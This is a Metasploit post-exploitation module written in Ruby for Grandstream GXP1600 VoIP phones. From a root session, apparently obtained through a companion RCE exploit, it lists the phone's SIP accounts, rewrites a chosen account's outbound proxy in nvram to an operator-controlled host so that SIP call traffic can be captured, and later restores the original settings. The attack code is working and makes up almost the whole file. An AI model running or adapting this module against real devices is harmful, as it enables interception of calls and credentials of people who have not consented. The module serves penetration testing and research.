##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Post::Linux::Priv

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'GrandStream GXP1600 proxy SIP traffic',
        'Description' => %q{
          This capture module works against Grandstream GXP1600 series VoIP devices and can reconfigure the device to use an
          arbitrary SIP proxy. You can first leverage the `exploit/linux/http/grandstream_gxp1600_unauth_rce` exploit
          module to get a root session on a target GXP1600 series device before running this post module.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'sfewer-r7'
        ],
        'Platform' => ['linux'],
        'SessionTypes' => ['shell', 'meterpreter'],
        'Actions' => [
          ['list', { 'Description' => 'List all SIP accounts.' }],
          ['start', { 'Description' => 'Start proxying SIP account traffic.' }],
          ['stop', { 'Description' => 'Start proxying SIP account traffic.' }]
        ],
        'DefaultAction' => 'list',
        'Notes' => {
          'Stability' => [
            # The phone service will not crash as we are only reconfiguring the phone.
            CRASH_SAFE,
            # If we don't revert the config changes after we proxy a SIP account, that SIP account can't operate if
            # the remote proxy is down.
            SERVICE_RESOURCE_LOSS
          ],
          'Reliability' => [],
          'SideEffects' => [
            # We config the phone to use our SIP proxy.
            CONFIG_CHANGES,
            # Adding a new SIP proxy may introduce audible latency during phone calls.
            AUDIO_EFFECTS
          ],
          'RelatedModules' => [
            'exploit/linux/http/grandstream_gxp1600_unauth_rce',
            'post/linux/gather/grandstream_gxp1600_creds'
          ]
        }
      )
    )

    register_options([
      OptPort.new('SIP_PROXY_UDP_PORT', [true, 'The remote SIP proxy UDP port', 5060 ]),
      OptAddress.new('SIP_PROXY_HOST', [true, 'The remote SIP proxy host address', nil]),
      OptInt.new('SIP_ACCOUNT_INDEX', [false, 'The zero-based SIP Account index to operate on.'], conditions: [ 'ACTION', 'in', %w[start stop]]),
    ])
  end

  def run
    unless action.name == 'list'
      fail_with(Failure::BadConfig, 'You must set the SIP_ACCOUNT_INDEX option.') if datastore['SIP_ACCOUNT_INDEX'].blank?

      fail_with(Failure::BadConfig, 'You must set the SIP_ACCOUNT_INDEX to a positive integer.') if datastore['SIP_ACCOUNT_INDEX'].negative?
    end

    fail_with(Failure::NoTarget, 'Module cannot run against this target.') unless gxp1600?

    sip_account = nil

    unless action.name == 'list'

      fail_with(Failure::BadConfig, 'You must set the SIP_ACCOUNT_INDEX to a valid index value.') if datastore['SIP_ACCOUNT_INDEX'] >= get_num_accounts

      sip_account = get_sip_account(datastore['SIP_ACCOUNT_INDEX'])

      fail_with(Failure::UnexpectedReply, 'Failed to retrieve the SIP account details.') unless sip_account
    end

    case action.name
    when 'list'
      list
    when 'start'
      start(sip_account)
    when 'stop'
      stop
    end
  end

  def list
    columns = ['Account Index', 'Account Enabled', 'Account Name', 'Display Name', 'User ID', 'Registrar Server', 'Registrar Server Transport', 'Outbound Proxy', 'Can Capture?']

    table = Rex::Text::Table.new(
      'Header' => 'SIP Accounts',
      'Indent' => 1,
      'Columns' => columns,
      'ColProps' => {
        'Can Capture?' => {
          'Stylers' => [::Msf::Ui::Console::TablePrint::CustomColorStyler.new({ 'Yes' => '%grn', 'No' => '%red' })]
        }
      }
    )

    0.upto(get_num_accounts - 1) do |account_idx|
      sip_account = get_sip_account(account_idx)

      next unless sip_account

      table << [
        account_idx.to_s,
        sip_account.dig('AccountEnable', 'data') == '0' ? 'No' : 'Yes',
        sip_account.dig('AccountName', 'data'),
        sip_account.dig('DisplayName', 'data'),
        sip_account.dig('UserID', 'data'),
        sip_account.dig('RegistrarServer', 'data'),
        transport_type(sip_account.dig('RegistrarServerTransport', 'data')),
        sip_account.dig('OutboundProxy', 'data'),
        can_capture?(sip_account) ? 'Yes' : 'No'
      ]
    end

    print_line(table.to_s)
  end

  def start(sip_account)
    fail_with(Failure::BadConfig, 'This SIP account traffic cannot be captured.') unless can_capture? sip_account

    # modify config...
    sip_account['AccountEnable']['data'] = 1
    sip_account['OutboundProxy']['data'] = "#{datastore['SIP_PROXY_HOST']}:#{datastore['SIP_PROXY_UDP_PORT']}"
    sip_account['UserAgentTransport']['data'] = 0 # udp
    sip_account['X_GRANDSTREAM_RemoveOBPFromRoute']['data'] = 0 # In route

    # backup current config to the devices /tmp folder, so we can easily restore orig settings, even in a new session.
    enc_data = Msf::Simple::Buffer.transform(sip_account.to_json.to_s, 'raw', '', { format: 'rc4', key: Rex::Text.sha2(client.core.machine_id) })

    sip_account_backup_path = "/tmp/#{Rex::Text.sha1("#{client.core.machine_id}_#{sip_account['index']}")}"

    fail_with(Failure::BadConfig, 'This SIP account config cannot be backed up.') unless write_file(sip_account_backup_path, enc_data)

    write_config(sip_account)
  end

  def stop
    sip_account_backup_path = "/tmp/#{Rex::Text.sha1("#{client.core.machine_id}_#{datastore['SIP_ACCOUNT_INDEX']}")}"

    print_status("Reading SIP account backup configuration: #{sip_account_backup_path}")
    enc_data = read_file(sip_account_backup_path)

    fail_with(Failure::BadConfig, 'No SIP account backup configuration.') unless enc_data

    print_status('Decrypting SIP account backup configuration.')
    dec_data = Msf::Simple::Buffer.transform(enc_data, 'raw', '', { format: 'rc4', key: Rex::Text.sha2(client.core.machine_id) })

    sip_account = JSON.parse(dec_data)

    if sip_account['index'].to_i != datastore['SIP_ACCOUNT_INDEX'].to_i
      fail_with(Failure::BadConfig, 'SIP account index mismatch.')
    end

    print_status('Reverting SIP account backup configuration')
    write_config(sip_account, revert: true)

    print_status("Deleting SIP account backup configuration: #{sip_account_backup_path}")
    file_rm(sip_account_backup_path)
  rescue JSON::ParserError
    fail_with(Failure::BadConfig, 'Failed to parse SIP account backup configuration.')
  end

  def gxp1600?
    unless is_root?
      user = cmd_exec('/usr/bin/whoami')
      print_error("This module requires root permissions. Module running as \"#{user}\" user.")
      return false
    end

    unless file? '/usr/bin/nvram'
      print_error('nvram binary not found')
      return false
    end

    model_str = nvram_get(89)

    # These 6 models all share the same firmware for the GXP1600 range.
    affected_models = %w[GXP1610 GXP1615 GXP1620 GXP1625 GXP1628 GXP1630]

    unless affected_models.include? model_str
      print_error("Phone is not a GXP1600 model. Detected model \"#{model_str}\".")
      return false
    end

    print_status("Module running against phone model #{model_str}")
    true
  end

  def nvram_get(pvalue)
    cmd_exec("/usr/bin/nvram get #{pvalue}")
  end

  def nvram_set(pvalue, data)
    cmd_exec("/usr/bin/nvram xet #{pvalue}=\"#{data.to_s.gsub('"', '\\"')}\"")
  end

  def nvram_commit
    # commit the changes to nvram
    cmd_exec('/usr/bin/nvram commit')

    # dbus_session will be something like "unix:path=/tmp/dbus-NS7MvuwBIA,guid=857fea90b077e2fbf8226a770000000e"
    dbus_session = cmd_exec('/usr/bin/nvram get dbus_session')

    # force the phone to pick up the changes
    cmd_exec("DBUS_SESSION_BUS_ADDRESS=#{dbus_session} /usr/bin/dbus-send --session /com/grandstream/dbus/gui com.grandstream.dbus.signal.cfupdated")
  end

  def write_config(sip_account, revert: false)
    changes = 0

    sip_account.each_value do |v|
      next unless v.instance_of? Hash

      next if v['data'] == v['orig_data']

      if revert
        nvram_set(v['pvalue'], v['orig_data'])
      else
        nvram_set(v['pvalue'], v['data'])
      end

      changes += 1
    end

    nvram_commit unless changes.zero?
  end

  def get_num_accounts
    read_file('/proc/gxp/dev_info/hw_features/num_accts').to_i
  end

  def get_sip_account(idx)
    # The GXP1600 series supports up to 6 SIP accounts, depending on the model.
    return nil unless (0..5).include?(idx)

    sip_accounts = {
      'AccountEnable' => [271, 401, 501, 601, 1701, 1801],
      'AccountName' => [270, 417, 517, 617, 1717, 1817],
      'DisplayName' => [3, 407, 507, 607, 1707, 1807],
      'AuthPassword' => [34, 406, 506, 606, 1706, 1806],
      'UserID' => [35, 404, 504, 604, 1704, 1804],
      'AuthUserName' => [36, 405, 505, 605, 1705, 1805],
      'RegistrarServer' => [47, 402, 502, 602, 1702, 1802],
      'RegistrarServerTransport' => [130, 448, 548, 648, 1748, 1848], # 0 - udp, 1 - tcp, 2 - tcp/tls
      'OutboundProxy' => [48, 403, 503, 603, 1703, 1803],
      'UserAgentPort' => [40, 413, 513, 613, 1713, 1813],
      'UserAgentTransport' => [130, 448, 548, 648, 1748, 1848], # 0 - udp, 1 - tcp, 2 - tcp/tls
      'X_GRANDSTREAM_RemoveOBPFromRoute' => [2305, 2405, 2505, 2605, 2705, 2805] # 0 - In route,  1 - Not in route, 2 - Always send to
    }

    sip_account = {
      'index' => idx
    }

    sip_accounts.each do |pvalue_name, pvalue_array|
      data = nvram_get(pvalue_array[idx])
      sip_account[pvalue_name] = {
        'pvalue' => pvalue_array[idx],
        'data' => data.dup,
        'orig_data' => data.dup
      }
    end

    sip_account
  end

  def transport_type(sip_transport)
    case sip_transport
    when '0'
      'udp'
    when '1'
      'tcp'
    when '2'
      'tcp/tls'
    else
      'unknown'
    end
  end

  def can_capture?(sip_account)
    !sip_account.dig('RegistrarServer', 'data').blank? &&
      (transport_type(sip_account.dig('RegistrarServerTransport', 'data')) == 'udp') &&
      (transport_type(sip_account.dig('UserAgentTransport', 'data')) == 'udp')
  end

end
